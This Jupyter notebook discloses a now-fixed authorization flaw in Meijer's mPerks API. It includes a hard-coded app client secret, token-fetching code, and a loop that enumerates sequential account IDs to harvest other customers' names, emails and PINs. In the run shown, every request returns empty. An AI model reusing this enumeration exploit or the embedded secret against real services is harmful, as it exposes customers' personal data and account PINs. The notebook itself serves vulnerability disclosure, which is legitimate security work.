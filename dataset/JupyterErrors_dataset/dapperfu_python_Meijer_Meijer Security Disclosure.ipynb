{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Meijer Security Disclosure\n",
    "\n",
    "I discovered this security issue when working on a Python API for the Meijer APIs.\n",
    "\n",
    "See ```00_MeijerAppInit``` and ```01_MeijerLogin``` for the full background into how I found this."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Setup.\n",
    "\n",
    "Code to get to the point of the security issue (Better documented in ```01_MeijerLogin```):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "# Generate the Authorization string from account_services_secret\n",
    "account_services_secret=\"drAqas76Re7RekeBanaMaNEMah7paDE5\"\n",
    "AUTH=base64.encodebytes(\"mma:{}\".format(account_services_secret).encode(\"UTF-8\")).decode(\"UTF-8\").strip()\n",
    "\n",
    "request=dict()\n",
    "request[\"url\"] = \"https://login.meijer.com/as/token.oauth2\"\n",
    "request[\"headers\"] = {\n",
    "    'Authorization': 'Basic {}'.format(AUTH),\n",
    "    'Platform': 'Android',\n",
    "    'Version': '5.10.0',\n",
    "    'Build': '51000000',\n",
    "    'User-Agent': 'okhttp/3.8.0'\n",
    "}\n",
    "request[\"params\"] =  {\n",
    "    'grant_type': 'client_credentials',\n",
    "    'scope': 'openid',\n",
    "    \"username\": os.environ[\"MEIJER_USER\"],\n",
    "    \"password\": os.environ[\"MEIJER_PASS\"] \n",
    "}\n",
    "r = requests.post(**request)\n",
    "assert r.status_code==200\n",
    "\n",
    "access_token=r.json()[\"access_token\"]\n",
    "\n",
    "def get_mperks(meijer_id):\n",
    "    request=dict()\n",
    "    request[\"url\"] = \"https://mservices.meijer.com/dgtlmma/accounts/getAccount?id={}\".format(meijer_id)\n",
    "    request[\"headers\"] = {\n",
    "        'Accept': 'application/vnd.meijer.account.account-v1.0+json',\n",
    "        'Authorization': 'Bearer {}'.format(access_token),\n",
    "        'Content-Type': 'application/json',\n",
    "        'Platform': 'Android',\n",
    "        'Version': '5.10.0',\n",
    "        'Build': '51000000',\n",
    "        'User-Agent': 'okhttp/3.8.0'\n",
    "    }\n",
    "    try:\n",
    "        r = requests.get(**request)\n",
    "        assert r.status_code==200\n",
    "        return r.json()\n",
    "    except:\n",
    "        return dict()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Issue [FIXED]\n",
    "\n",
    "The backend doesn't actually validate/verify/authenticate the user beyond the headers. You can edit the ```id=``` in the URL to get the data for any mPerks user.\n",
    "\n",
    "As demonstrated here:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "accounts = list()\n",
    "for meijer_id in range(13266000, 13266020):\n",
    "    accounts.append(get_mperks(meijer_id))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[{},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {},\n",
       " {}]"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "accounts"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "At one time, this was all available to the public. If you use your mPerks PIN as your ATM PIN, change it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "ename": "KeyError",
     "evalue": "'firstName'",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-3-18dde6f90a17>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0;32mfor\u001b[0m \u001b[0maccount\u001b[0m \u001b[0;32min\u001b[0m \u001b[0maccounts\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 2\u001b[0;31m     \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"{firstName} {lastName} <{email}> {mPerksPin}\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m**\u001b[0m\u001b[0maccount\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mKeyError\u001b[0m: 'firstName'"
     ]
    }
   ],
   "source": [
    "for account in accounts:\n",
    "    print(\"{firstName} {lastName} <{email}> {mPerksPin}\".format(**account))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
